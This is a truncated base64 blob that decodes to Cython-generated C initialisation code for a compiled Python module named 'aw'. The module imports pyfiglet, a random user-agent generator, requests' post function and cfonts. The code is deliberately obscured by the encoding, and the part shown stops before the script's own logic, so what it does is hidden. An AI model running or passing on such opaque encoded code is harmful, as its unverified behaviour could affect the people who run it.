T05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKewogIHJldHVybiBQeU1vZHVsZURlZl9Jbml0KCZfX3B5eF9tb2R1bGVkZWYpOwp9CgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUFlfSU5UNjRfVCBfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCh2b2lkKSB7CiAgICB7CiAgICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiX2ludGVycHJldGVycyIpOyAvLyAzLjEzKyBJIHRoaW5rCiAgICAgICAgaWYgKCFtb2R1bGUpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8ganVzdCB0cnkgdGhlIDMuOC0zLjEyIHZlcnNpb24KICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJfeHhzdWJpbnRlcnByZXRlcnMiKTsKICAgICAgICAgICAgaWYgKCFtb2R1bGUpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBQeU9iamVjdCAqY3VycmVudCA9IFB5T2JqZWN0X0NhbGxNZXRob2QobW9kdWxlLCAiZ2V0X2N1cnJlbnQiLCBOVUxMKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBpZiAoIWN1cnJlbnQpIGdvdG8gYmFkOwogICAgICAgIGlmIChQeVR1cGxlX0NoZWNrKGN1cnJlbnQpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpuZXdfY3VycmVudCA9IFB5U2VxdWVuY2VfR2V0SXRlbShjdXJyZW50LCAwKTsKICAgICAgICAgICAgUHlfREVDUkVGKGN1cnJlbnQpOwogICAgICAgICAgICBjdXJyZW50ID0gbmV3X2N1cnJlbnQ7CiAgICAgICAgICAgIGlmICghbmV3X2N1cnJlbnQpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBsb25nIGxvbmcgYXNfY19pbnQgPSBQeUxvbmdfQXNMb25nTG9uZyhjdXJyZW50KTsKICAgICAgICBQeV9ERUNSRUYoY3VycmVudCk7CiAgICAgICAgcmV0dXJuIGFzX2NfaW50OwogICAgfQogIGJhZDoKICAgIFB5U3lzX1dyaXRlU3RkZXJyKCJfX1B5eF9HZXRDdXJyZW50SW50ZXJwcmV0ZXJJZCBmYWlsZWQuIFRyeSBzZXR0aW5nIHRoZSBDIGRlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQ9MFxuIik7CiAgICByZXR1cm4gLTE7Cn0KI2VuZGlmCiNpZiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jaGVja19zaW5nbGVfaW50ZXJwcmV0ZXIodm9pZCkgewogICAgc3RhdGljIFBZX0lOVDY0X1QgbWFpbl9pbnRlcnByZXRlcl9pZCA9IC0xOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTAogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElERnJvbVRocmVhZFN0YXRlKFB5VGhyZWFkU3RhdGVfR2V0KCkpOwojZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMAogICAgUFlfSU5UNjRfVCBjdXJyZW50X2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7CiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFBZX0lOVDY0X1QgY3VycmVudF9pZCA9IF9fUHl4X0dldEN1cnJlbnRJbnRlcnByZXRlcklkKCk7CiNlbHNlCiAgICBQWV9JTlQ2NF9UIGN1cnJlbnRfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoUHlUaHJlYWRTdGF0ZV9HZXQoKS0+aW50ZXJwKTsKI2VuZGlmCiAgICBpZiAodW5saWtlbHkoY3VycmVudF9pZCA9PSAtMSkpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAobWFpbl9pbnRlcnByZXRlcl9pZCA9PSAtMSkgewogICAgICAgIG1haW5faW50ZXJwcmV0ZXJfaWQgPSBjdXJyZW50X2lkOwogICAgICAgIHJldHVybiAwOwogICAgfSBlbHNlIGlmICh1bmxpa2VseShtYWluX2ludGVycHJldGVyX2lkICE9IGN1cnJlbnRfaWQpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKAogICAgICAgICAgICBQeUV4Y19JbXBvcnRFcnJvciwKICAgICAgICAgICAgIkludGVycHJldGVyIGNoYW5nZSBkZXRlY3RlZCAtIHRoaXMgbW9kdWxlIGNhbiBvbmx5IGJlIGxvYWRlZCBpbnRvIG9uZSBpbnRlcnByZXRlciBwZXIgcHJvY2Vzcy4iKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gMDsKfQojZW5kaWYKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9jb3B5X3NwZWNfdG9fbW9kdWxlKFB5T2JqZWN0ICpzcGVjLCBQeU9iamVjdCAqbW9kZGljdCwgY29uc3QgY2hhciogZnJvbV9uYW1lLCBjb25zdCBjaGFyKiB0b19uYW1lLCBpbnQgYWxsb3dfbm9uZSkKewogICAgUHlPYmplY3QgKnZhbHVlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCBmcm9tX25hbWUpOwogICAgaW50IHJlc3VsdCA9IDA7CiAgICBpZiAobGlrZWx5KHZhbHVlKSkgewogICAgICAgIGlmIChhbGxvd19ub25lIHx8IHZhbHVlICE9IFB5X05vbmUpIHsKICAgICAgICAgICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW1TdHJpbmcobW9kZGljdCwgdG9fbmFtZSwgdmFsdWUpOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYodmFsdWUpOwogICAgfSBlbHNlIGlmIChQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX0F0dHJpYnV0ZUVycm9yKSkgewogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IC0xOwogICAgfQogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgUHlPYmplY3QqIF9fcHl4X3B5bW9kX2NyZWF0ZShQeU9iamVjdCAqc3BlYywgUHlNb2R1bGVEZWYgKmRlZikgewogICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICptb2RkaWN0LCAqbW9kbmFtZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGRlZik7CiAgICAjaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgICBpZiAoX19QeXhfY2hlY2tfc2luZ2xlX2ludGVycHJldGVyKCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAjZW5kaWYKICAgIGlmIChfX3B5eF9tKQogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbSk7CiAgICBtb2RuYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhzcGVjLCAibmFtZSIpOwogICAgaWYgKHVubGlrZWx5KCFtb2RuYW1lKSkgZ290byBiYWQ7CiAgICBtb2R1bGUgPSBQeU1vZHVsZV9OZXdPYmplY3QobW9kbmFtZSk7CiAgICBQeV9ERUNSRUYobW9kbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gYmFkOwogICAgbW9kZGljdCA9IFB5TW9kdWxlX0dldERpY3QobW9kdWxlKTsKICAgIGlmICh1bmxpa2VseSghbW9kZGljdCkpIGdvdG8gYmFkOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X2NvcHlfc3BlY190b19tb2R1bGUoc3BlYywgbW9kZGljdCwgImxvYWRlciIsICJfX2xvYWRlcl9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAib3JpZ2luIiwgIl9fZmlsZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAicGFyZW50IiwgIl9fcGFja2FnZV9fIiwgMSkgPCAwKSkgZ290byBiYWQ7CiAgICBpZiAodW5saWtlbHkoX19QeXhfY29weV9zcGVjX3RvX21vZHVsZShzcGVjLCBtb2RkaWN0LCAic3VibW9kdWxlX3NlYXJjaF9sb2NhdGlvbnMiLCAiX19wYXRoX18iLCAwKSA8IDApKSBnb3RvIGJhZDsKICAgIHJldHVybiBtb2R1bGU7CmJhZDoKICAgIFB5X1hERUNSRUYobW9kdWxlKTsKICAgIHJldHVybiBOVUxMOwp9CgoKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9weW1vZF9leGVjX2F3KFB5T2JqZWN0ICpfX3B5eF9weWluaXRfbW9kdWxlKQojZW5kaWYKewogIGludCBzdHJpbmd0YWJfaW5pdGlhbGl6ZWQgPSAwOwogICNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogIGludCBweXN0YXRlX2FkZG1vZHVsZV9ydW4gPSAwOwogICNlbmRpZgogIF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNjsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBpbnQgX19weXhfdF84OwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMTE7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBpZiAoX19weXhfbSkgewogICAgaWYgKF9fcHl4X20gPT0gX19weXhfcHlpbml0X21vZHVsZSkgcmV0dXJuIDA7CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCAiTW9kdWxlICdhdycgaGFzIGFscmVhZHkgYmVlbiBpbXBvcnRlZC4gUmUtaW5pdGlhbGlzYXRpb24gaXMgbm90IHN1cHBvcnRlZC4iKTsKICAgIHJldHVybiAtMTsKICB9CiAgI2Vsc2UKICBpZiAoX19weXhfbSkgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tKTsKICAjZW5kaWYKICAKICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgX19weXhfdF8xID0gX19weXhfcHlpbml0X21vZHVsZTsKICBQeV9JTkNSRUYoX19weXhfdF8xKTsKICAjZWxzZQogIF9fcHl4X3RfMSA9IFB5TW9kdWxlX0NyZWF0ZSgmX19weXhfbW9kdWxlZGVmKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgewogICAgaW50IGFkZF9tb2R1bGVfcmVzdWx0ID0gX19QeXhfU3RhdGVfQWRkTW9kdWxlKF9fcHl4X3RfMSwgJl9fcHl4X21vZHVsZWRlZik7CiAgICBfX3B5eF90XzEgPSAwOyAKICAgIGlmICh1bmxpa2VseSgoYWRkX21vZHVsZV9yZXN1bHQgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAgIHB5c3RhdGVfYWRkbW9kdWxlX3J1biA9IDE7CiAgfQogICNlbHNlCiAgX19weXhfbSA9IF9fcHl4X3RfMTsKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICBQeVVuc3RhYmxlX01vZHVsZV9TZXRHSUwoX19weXhfbSwgUHlfTU9EX0dJTF9VU0VEKTsKICAjZW5kaWYKICBfX3B5eF9tc3RhdGUgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsOwogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X3RfMSk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF9kID0gUHlNb2R1bGVfR2V0RGljdChfX3B5eF9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2QpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgUHlfSU5DUkVGKF9fcHl4X21zdGF0ZS0+X19weXhfZCk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF9iID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfYikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lID0gX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKCJjeXRob25fcnVudGltZSIpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5T2JqZWN0X1NldEF0dHJTdHJpbmcoX19weXhfbSwgIl9fYnVpbHRpbnNfXyIsIF9fcHl4X21zdGF0ZS0+X19weXhfYikgPCAwKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgCiAgI2lmIENZVEhPTl9SRUZOQU5OWQpfX1B5eF9SZWZOYW5ueSA9IF9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKCJyZWZuYW5ueSIpOwppZiAoIV9fUHl4X1JlZk5hbm55KSB7CiAgUHlFcnJfQ2xlYXIoKTsKICBfX1B5eF9SZWZOYW5ueSA9IF9fUHl4X1JlZk5hbm55SW1wb3J0QVBJKCJDeXRob24uUnVudGltZS5yZWZuYW5ueSIpOwogIGlmICghX19QeXhfUmVmTmFubnkpCiAgICAgIFB5X0ZhdGFsRXJyb3IoImZhaWxlZCB0byBpbXBvcnQgJ3JlZm5hbm55JyBtb2R1bGUiKTsKfQojZW5kaWYKCl9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJQeUluaXRfYXciLCAwKTsKICBpZiAoX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24oX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCwgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpLCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNpZmRlZiBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cwogIF9fUHh5X1B5RnJhbWVfSW5pdGlhbGl6ZV9PZmZzZXRzKCk7CiAgI2VuZGlmCiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSA9IFB5VHVwbGVfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoIiIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKCIiLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgCiAgaWYgKF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIHN0cmluZ3RhYl9pbml0aWFsaXplZCA9IDE7CiAgaWYgKF9fUHl4X0luaXRHbG9iYWxzKCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjaWYgMCB8fCBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgfHwgZGVmaW5lZChfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQ29yb3V0aW5lX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfR2VuZXJhdG9yX1VTRUQpIHx8IGRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRCkKICBpZiAoX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChfX3B5eF9tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICNlbmRpZgogICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICBpZiAoX19weXhfQ3lGdW5jdGlvbl9pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRAogIGlmIChfX3B5eF9GdXNlZEZ1bmN0aW9uX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICBpZiAoX19weXhfQ29yb3V0aW5lX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICBpZiAoX19weXhfR2VuZXJhdG9yX2luaXQoX19weXhfbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogIGlmIChfX3B5eF9Bc3luY0dlbl9pbml0KF9fcHl4X20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgI2VuZGlmCiAgCiAgaWYgKF9fcHl4X21vZHVsZV9pc19tYWluX2F3KSB7CiAgICBpZiAoUHlPYmplY3RfU2V0QXR0cihfX3B5eF9tLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21haW4pIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgfQogIHsKICAgIFB5T2JqZWN0ICptb2R1bGVzID0gUHlJbXBvcnRfR2V0TW9kdWxlRGljdCgpOyBpZiAodW5saWtlbHkoIW1vZHVsZXMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoIVB5RGljdF9HZXRJdGVtU3RyaW5nKG1vZHVsZXMsICJhdyIpKSB7CiAgICAgIGlmICh1bmxpa2VseSgoUHlEaWN0X1NldEl0ZW1TdHJpbmcobW9kdWxlcywgImF3IiwgX19weXhfbSkgPCAwKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICAgIH0KICB9CiAgCiAgaWYgKF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgCiAgaWYgKF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgCiAgKHZvaWQpX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgKHZvaWQpX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGUpOwogICh2b2lkKV9fUHl4X21vZGluaXRfZnVuY3Rpb25fZXhwb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICBpZiAodW5saWtlbHkoKF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRlKSA8IDApKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogICh2b2lkKV9fUHl4X21vZGluaXRfdHlwZV9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpOwogICh2b2lkKV9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRlKTsKICAodm9pZClfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgCgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHlmaWdsZXQsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3B5ZmlnbGV0LCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyX2FnZW50LCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBfX3B5eF90XzMsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zYXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nmb250cywgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlciwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2F5KTsgaWYgKH